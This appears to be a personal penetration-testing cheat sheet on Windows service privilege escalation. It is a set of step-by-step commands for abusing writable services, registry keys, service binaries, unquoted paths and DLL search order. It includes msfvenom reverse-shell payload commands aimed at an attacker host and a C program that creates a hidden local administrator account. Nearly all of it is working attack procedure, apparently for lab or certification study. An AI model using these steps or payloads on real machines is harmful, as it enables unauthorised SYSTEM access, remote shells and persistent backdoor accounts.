---
title: Services
parent: Method (Windows)
layout: default
nav_order: 1
---

Quick enum:
1. `tasklist /SVC`\
   for list of processes related to services.
2. `sc qc servicename`\
   Query configuration\
   `sc query servicename`\
   Query current status\
   `sc config servicename option=value`\
   Modify configuration\
   `net start servicename`\
   `net stop servicename`\
   Start/Stop service
3. `accesschk.exe /accepteula -uwcqv "Authenticated Users" *`\
   to check which service you have access

## Insecure Service Permission
1. `winpeas.exe quiet servicesinfo` - first check
2. Check if can modify any service.
3. Confirm the access: `accesschk.exe /accepteula -uwcqv username servicename`
4. Check config: `sc qc servicename`
5. Check status: `sc query servicename`
6. Reconfigure to our reverse shell: `sc config servicename binpath= "\"C:\PrivEsc\reverse.exe\""` (or try `sc config upnphost binpath= "C:\shell3.exe"`)
7. Optional: `sc config servicename obj= ".\LocalSystem" password= ""`
8. Start listener, then start/restart the service with `net start servicename`
9. If the service is automatic and you cant restart service, can try restart pc with `shutdown /r /t 0` (USE `shutdown -r -t 10 && exit`, it is better!)

## Weak Registry Permissions
1. `winpeas.exe quiet servicesinfo` - first check
2. Check for weak registry entry.
3. Use Powershell to confirm: `Get-Acl HKLM:\System\CurrentControlSet\Services\servicename | Format-List`. Can use accesschk as well: `accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\servicename`
4. Overwrite the image path to our shell: `reg add HKLM\SYSTEM\CurrentControlSet\services\servicename /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f`
5. Start listener, then start/restart the service with `net start servicename`
6. If the service is automatic and you cant restart service, can try restart pc with `shutdown /r /t 0` (USE `shutdown -r -t 10 && exit`, it is better!)

## Insecure Service Executable
1. `winpeas.exe quiet servicesinfo` - first check
2. Check for executable that can be written by everyone.
3. Use accesschk to confirm: `accesschk.exe /accepteula -quvw "C:\Program Files\Some Program\programname.exe"`
4. Backup the file: `copy "C:\Program Files\Some Program\programname.exe" C:\Temp`
5. Replace with our shell: `copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"`
6. Alternative: Use `move originalservice.exe backupservice.exe` to move the file away as backup, then copy the exploit file using `copy shell80.exe originalservice.exe`. (This can bypass the 'service running error')
7. Start listener, then start/restart the service with `net start servicename`
8. If the service is automatic and you cant restart service, can try restart pc with `shutdown /r /t 0`  (USE `shutdown -r -t 10 && exit`, it is better!)
9. To create the executable:\
    `msfvenom --platform Windows -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe-service -o service1.exe`
10. Alternatively, can use the C code below (change the exec to the service that you backup-ed. Note: can remove WinExec line if it causes trouble. Just login using the account created.):

addAdmin.c
```
int main(void){
     system("net user test password1234 /add");
     system("net localgroup Administrators test /add");
     WinExec("C:\\bd\\bd.service.exe",0);
    return 0;
    }
```

11. Compile using: `i686-w64-mingw32-gcc addAdmin.c -l ws2_32 -o addAdmin.exe`
12. Use `move originalservice.exe backupservice.exe` to move the file away as backup, then copy the exploit file using `copy shell80.exe originalservice.exe`. (This can bypass the 'service running error')

## Insecure Service File Permission
1. `Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}` to get running services and their executable path.
2. `icacls "C:\Program Files\xx.exe"` to use icacls and see what permissions we have. F-Full, M-Modify, RX-Read and Execute, R-Read only, W-Write only.
3. If access is available we can try to replace this executable (either with reverse shell or add user). Use `move originalservice.exe backupservice.exe` to move the file away as backup, then copy the exploit file using `copy shell80.exe originalservice.exe`. (This can bypass the 'service running error')
4. Can first try restart service after replacing with `net stop xx` and `net start xx`. If cannot, check if the service is automatic with `wmic service where caption="Serviio" get name, caption, state, startmode`. If yes, can restart the PC for it to restart service.
5. Check if you can restart PC: `whoami /priv`. If SeShutdownPrivilege is listed, means can restart with `shutdown /r /t 0`.  (USE `shutdown -r -t 10 && exit`, it is better!)

## Unquoted Service Path
1. If any of the service path is unquoted (for example: `C:\Program Files\My Program\My Service\service.exe`), Windows will interpret (based on order) the following: `C:\Program.exe`, `C:\Program Files\My.exe`, `C:\Program Files\My Program\My.exe`, `C:\Program Files\My Program\My Service\service.exe`.
2. We can then replace our executable in any of the path above.
3. `winpeas.exe quiet servicesinfo` - first check
4. Check for any unquoted path with spaces.
5. `sc qc servicename` to confirm.
6. Check for permission:\
   `accesschk.exe /accepteula -uwdq C:`\
   `accesschk.exe /accepteula -uwdq "C:\Program Files\"`\
   `accesschk.exe /accepteula -uwdq "C:\Program Files\My Program"`
7. Put the shell in any of the writable path.
8. Start listener, then start/restart the service with `net start servicename`
9. If the service is automatic and you cant restart service, can try restart pc with `shutdown /r /t 0` (USE `shutdown -r -t 10 && exit`, it is better!)

## DLL Hijacking
1. `winpeas.exe quiet servicesinfo` - first check
2. Check writable directory and is in PATH.
3. Check we can start and stop which services: `accesschk.exe /accepteula -uvqc username somedllsvc`
4. Confirm the executable: `sc qc somedllsvc`
5. Run procmon64 with admin and filter based on "`Process name matching dllexecutable.exe`"
6. On procmon main screen, deselect registry activity and network activity.
7. Start/Restart the service: `net start somedllsvc`
8. In Procmon will see that there are a few NAME NOT FOUND error with dll name.
9. Use msfvenom:\
    `msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f dll -o dllname.dll`
10. Start listener, then start/restart the service with `net start servicename`
11. If need to restart use `shutdown -r -t 10 && exit`.

## IKEEXT
1. Use `sc query IKEEXT`
2. Confirm the dll file does not exist: `dir wlbsctrl.dll /s`
3. Get the PATH to see where we can inject our DLL: `PATH`
4. Perform icacls on the path to see where we can write, eg: `icacls C:\Python\Scripts\ `
5. If we have modify/full permission, can generate the dll and put there:\
   `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f dll > wlbsctrl.dll`
6. Set the listener and power cycle it: `shutdown -r -t 10 && exit`